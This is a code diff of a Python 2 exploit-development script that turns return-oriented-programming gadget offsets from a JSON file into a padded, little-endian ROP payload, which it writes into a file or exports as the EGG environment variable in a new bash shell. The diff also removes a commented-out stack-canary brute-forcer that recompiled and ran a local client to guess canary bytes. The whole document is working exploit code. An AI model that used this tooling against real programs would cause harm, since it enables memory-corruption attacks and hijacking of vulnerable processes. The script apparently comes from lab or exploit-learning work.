@@ -6,10 +6,14 @@ import subprocess
 class GenerateROPShellcode(object):
     """
     @params
+    padding: padding value for the program to be exploited
     id: The id of the ROP code that needs to be converted to shellcode
-    json_file: JSON file 
+    json_file: JSON file in which the code is stored - src/rop/rop_codes.json
+    write_code: Write the code into a file rather than set it as an environment variable in a new bash
+    file_name: Name of the file into which the shellcode should be written into
+    line_num: Line number at which the shellcode array should be inserted
     """
-    def __init__(self, padding, _id, json_file, print_code=False, file_name=None, line_num=-1):
+    def __init__(self, padding, _id, json_file, write_code=False, file_name=None, line_num=-1):
         self._id = _id
         self.code = ''
         self.padding = padding
@@ -18,12 +22,19 @@ class GenerateROPShellcode(object):
         self.data_base = 0x0
         self.addresses = []
         self.shellcode = ''
-        self.print_code = print_code
+        self.write_code = write_code
         self.file_name = None
         self.line_num = -1
         self.FNULL = open(os.devnull, 'w')
 
-    def get_code(self):
+    """
+    This function reads the values from the chosen JSON entry.
+    Values read:
+    libc_base
+    data_base
+    code
+    """
+    def get_values(self):
         with open(self.json_file) as json_file:
             json_data = json.load(json_file)
             for k, v in json_data.iteritems():
@@ -34,6 +45,15 @@ class GenerateROPShellcode(object):
                         self.data_base = hex(int(values['data_base'].replace('L', ''), 16))
         self.construct_shellcode()
 
+    """
+    The function constructs the shellcode.
+        1. Adds the ROP commands' addresses to libc_base.
+        2. Adds address offset to data_base.
+        3. Leaves padding and data as is.
+        4. Adds padding to the beginning of the addresses have been chained together.
+        5. Performs Little Endian formatting.
+        6. Either writes the code into a file or sets it as an environment variable.
+    """
     def construct_shellcode(self):
         commands = self.code.split('\n')
         for command in commands:
@@ -54,7 +74,7 @@ class GenerateROPShellcode(object):
         for address in self.addresses:
             self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]
 
-        if self.print_code:
+        if self.write_code:
             if self.file_name is None:
                 self.file_name = input('To which file would you like to write the shellcode? ')
             fo = open(self.file_name, 'r')
@@ -79,56 +99,15 @@ class GenerateROPShellcode(object):
             os.putenv('EGG', self.shellcode)
             subprocess.call('/bin/bash', shell=True)
 
-    """
-    Guess the stack canary values.
-    Fails if the program being exploited restarts.
-    """
-    """
-    def read_stack(self):
-        count = 8
-        while (count > 0):
-            status = -6
-            current_byte = -1
-            self.shellcode = self.shellcode + ('ff'.decode('hex'))
-            while (status == -6):
-                current_byte += 1
-                self.value = hex(current_byte).split('x')[1].zfill(2)
-                print 'Current byte: 0x{:s}'.format(self.value)
-                try:
-                    status = self.write_to_file()
-                    print status
-                except TypeError:
-                    print 'TypeError'
-                    status = 1
-            self.shellcode = self.shellcode[:-1] + str(self.value)
-            print 'Only {:d} bytes to go'.format(count)
-            count = count - 1
-
-    def write_to_file(self):
-        FNULL = open(os.devnull, 'w')
-        output_file = 'src/simple_client.c'
-        fo = open(output_file, 'r')
-        contents = fo.readlines()
-        fo.close()
-        fo = open(output_file, 'w+')
-        line_num = 11
-        contents[line_num - 1] = contents[line_num - 1][:-3] + '\\x' + self.value + '";\n\n'
-        contents = ''.join(contents)
-        fo.write(contents)
-        fo.close()
-        subprocess.call('./rebuild.sh', shell=False)
-        return subprocess.call(['bin/simple_client', '127.0.0.1', '10000', 'index.html'], stdout=FNULL, stderr=subprocess.STDOUT, shell=False)
-    """
-
 def main():
     if len(sys.argv) < 4:
         print 'Padding, ID of rop code and json file required.\n'
     elif len(sys.argv) == 4:
         generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3])
-        generator.get_code()
+        generator.get_values()
     else:
-        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3], print_code=(sys.argv[4] == 'print'))
-        generator.get_code()
+        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3], write_code=(sys.argv[4] == 'write'))
+        generator.get_values()
 
 if __name__ == '__main__':
     main()
